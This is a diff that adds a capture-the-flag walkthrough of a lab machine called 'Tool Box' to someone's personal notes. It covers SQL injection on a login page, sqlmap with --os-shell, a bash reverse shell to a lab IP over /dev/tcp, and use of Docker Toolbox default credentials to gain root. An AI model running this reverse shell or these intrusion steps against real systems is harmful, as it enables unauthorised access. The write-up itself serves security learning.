@@ -1260,3 +1260,51 @@ I was wrong with the bash, I had to copy th bash binary as augustus in the host 
 ![[Pasted image 20250123004351.png]]
 I was not able to do this and then I realized that I had to assign the owner of the binary and then the permissions
 ![[Pasted image 20250123005359.png]]
+
+### Tool Box
+#### Initial Access
+![[Pasted image 20250123135944.png]]
+So, we have a windows machine, lets begin with the enumeration of the services
+We have anon login as shown by nmap scan
+![[Pasted image 20250123140430.png]]
+It only has and .exe which appears to be the docker Toolbox installer
+The we have an webpage on port 443
+This page seems to be hosted on an UNIX system so, having in mind that maybe there is docker installed, this page could be in a container
+![[Pasted image 20250123141351.png]]
+We have this info in the certificate
+![[Pasted image 20250123143316.png]]
+We have this login panel
+![[Pasted image 20250123143616.png]]
+Lets analyze this in burp
+![[Pasted image 20250123144047.png]]
+It appears to be vulnerable to SQLi
+![[Pasted image 20250123144445.png]]
+![[Pasted image 20250123144908.png]]
+After sometime, i realized that if we try this in the username input we have a redirection
+![[Pasted image 20250123145850.png]]
+And we byppassed the login page
+![[Pasted image 20250123145913.png]]
+There is nothing in this dashboard, so lets use sqlmap and see wwaht we got
+To save the request from burp
+![[Pasted image 20250123152108.png]]
+And we use this request in SQLMap
+![[Pasted image 20250123152212.png]]
+Perfect, we have the different vulnerabilities
+![[Pasted image 20250123152438.png]]
+We got the hash for the admin password
+![[Pasted image 20250123152924.png]]
+So now lets try and crack it, since we know is an md5 hash from the recon
+After a long time, since I could advance, I look at the walkthroug and so I discovered a function from SQLMap to execute os commands
+using
+`sqlmap -r request.req --force-sql --os-shell`
+This allows to give an os command, so we can use a reverse shell
+`bash -c 'bash -i &> /dev/tcp/10.10.14.12/4444 0>&1'`
+Perfect, we have our reverse shell
+![[Pasted image 20250123164048.png]]
+Since we are in a container I used a portscanner with bash to see of there is another open ports
+![[Pasted image 20250123165659.png]]
+so apparently toolbox has the default credential docker:tcuser
+And this works
+Once we are in the host machine we can change to the root user without passwd
+find / -name root.txt 2>/dev/null
+![[Pasted image 20250123173119.png]]
